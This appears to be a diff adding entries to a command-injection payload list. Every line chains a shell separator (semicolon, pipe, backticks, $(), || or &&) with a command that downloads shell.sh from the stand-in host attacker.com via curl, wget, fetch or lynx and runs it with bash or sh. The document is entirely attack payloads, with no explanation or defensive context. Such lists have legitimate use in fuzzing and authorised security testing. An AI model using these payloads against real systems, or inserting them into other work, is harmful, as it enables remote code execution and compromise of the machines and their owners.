+`curl -s http://attacker.com/shell.sh | bash`
+$(curl -s http://attacker.com/shell.sh | bash)
+||curl -s http://attacker.com/shell.sh | bash
+&&curl -s http://attacker.com/shell.sh | bash
+;curl -s http://attacker.com/shell.sh | sh
+|curl -s http://attacker.com/shell.sh | sh
+`curl -s http://attacker.com/shell.sh | sh`
+$(curl -s http://attacker.com/shell.sh | sh)
+||curl -s http://attacker.com/shell.sh | sh
+&&curl -s http://attacker.com/shell.sh | sh
+;fetch -o- http://attacker.com/shell.sh | bash
+|fetch -o- http://attacker.com/shell.sh | bash
+`fetch -o- http://attacker.com/shell.sh | bash`
+$(fetch -o- http://attacker.com/shell.sh | bash)
+||fetch -o- http://attacker.com/shell.sh | bash
+&&fetch -o- http://attacker.com/shell.sh | bash
+;fetch -o- http://attacker.com/shell.sh | sh
+|fetch -o- http://attacker.com/shell.sh | sh
+`fetch -o- http://attacker.com/shell.sh | sh`
+$(fetch -o- http://attacker.com/shell.sh | sh)
+||fetch -o- http://attacker.com/shell.sh | sh
+&&fetch -o- http://attacker.com/shell.sh | sh
+;lynx -source http://attacker.com/shell.sh | bash
+|lynx -source http://attacker.com/shell.sh | bash
+`lynx -source http://attacker.com/shell.sh | bash`
+$(lynx -source http://attacker.com/shell.sh | bash)
+||lynx -source http://attacker.com/shell.sh | bash
+&&lynx -source http://attacker.com/shell.sh | bash
+;lynx -source http://attacker.com/shell.sh | sh
+|lynx -source http://attacker.com/shell.sh | sh
+`lynx -source http://attacker.com/shell.sh | sh`
+$(lynx -source http://attacker.com/shell.sh | sh)
+||lynx -source http://attacker.com/shell.sh | sh
+&&lynx -source http://attacker.com/shell.sh | sh
+;wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+|wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+`wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh`
+$(wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh)
+||wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+&&wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+;wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+|wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+`wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh`
+$(wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh)
+||wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+&&wget -q -O /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+;curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+|curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+`curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh`
+$(curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh)
+||curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+&&curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+;curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+|curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+`curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh`
+$(curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh)
+||curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+&&curl -s -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+;fetch -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+|fetch -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+`fetch -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh`
+$(fetch -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh)
+||fetch -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+&&fetch -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh
+;fetch -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+|fetch -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+`fetch -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh`
+$(fetch -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh)
+||fetch -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+&&fetch -o /tmp/shell.sh http://attacker.com/shell.sh && sh /tmp/shell.sh
+;lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && bash /tmp/shell.sh
+|lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && bash /tmp/shell.sh
+`lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && bash /tmp/shell.sh`
+$(lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && bash /tmp/shell.sh)
+||lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && bash /tmp/shell.sh
+&&lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && bash /tmp/shell.sh
+;lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && sh /tmp/shell.sh
+|lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && sh /tmp/shell.sh
+`lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && sh /tmp/shell.sh`
+$(lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && sh /tmp/shell.sh)
+||lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && sh /tmp/shell.sh
+&&lynx -source http://attacker.com/shell.sh > /tmp/shell.sh && sh /tmp/shell.sh
